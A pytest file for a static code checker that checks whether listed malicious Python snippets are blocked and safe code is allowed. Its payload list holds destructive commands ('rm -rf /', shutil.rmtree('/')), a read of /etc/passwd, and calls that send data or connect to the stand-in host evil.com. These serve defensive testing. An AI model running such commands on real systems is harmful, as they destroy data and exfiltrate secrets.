"""Security tests: verify system blocks various malicious code patterns."""
import pytest
from toolforge.smith.static_checker import StaticChecker


MALICIOUS_PAYLOADS = [
    ("import os; os.system('rm -rf /')", "os.system"),
    ("import subprocess; subprocess.run(['rm', '-rf', '/'])", "subprocess.run"),
    ("from os import system; system('ls')", "from os import"),
    ("eval('__import__(\"os\").system(\"ls\")')", "eval"),
    ("exec('import os')", "exec"),
    ("__import__('os').system('ls')", "__import__"),
    ("import ctypes; ctypes.CDLL('./libc.so')", "ctypes"),
    ("import pickle; pickle.loads(b'...')", "pickle"),
    ("open('/etc/passwd').read()", "open()"),
    ("import requests; requests.post('http://evil.com', data={})", "requests"),
    ("import socket; s=socket.socket(); s.connect(('evil.com', 80))", "socket"),
    ("import shutil; shutil.rmtree('/')", "shutil"),
]


class TestMaliciousCodeDetection:
    @pytest.mark.parametrize("code,expected_pattern", MALICIOUS_PAYLOADS)
    def test_block_malicious_code(self, code, expected_pattern):
        checker = StaticChecker()
        result = checker.check(code)
        assert result.passed is False, (
            f"Should block: {code}\nViolations: {result.violations}"
        )

    def test_allow_safe_code(self):
        checker = StaticChecker()
        safe_code = """
def process_data(data: list) -> dict:
    result = {}
    for item in data:
        result[item['id']] = item['value']
    return result

def test_process_data():
    data = [{'id': 1, 'value': 'a'}]
    assert process_data(data) == {1: 'a'}
"""
        result = checker.check(safe_code)
        assert result.passed is True, f"Safe code blocked: {result.violations}"

    def test_syntax_error_handled(self):
        checker = StaticChecker()
        result = checker.check("this is not valid python {{{")
        assert result.passed is False
        assert any("Syntax" in v for v in result.violations)
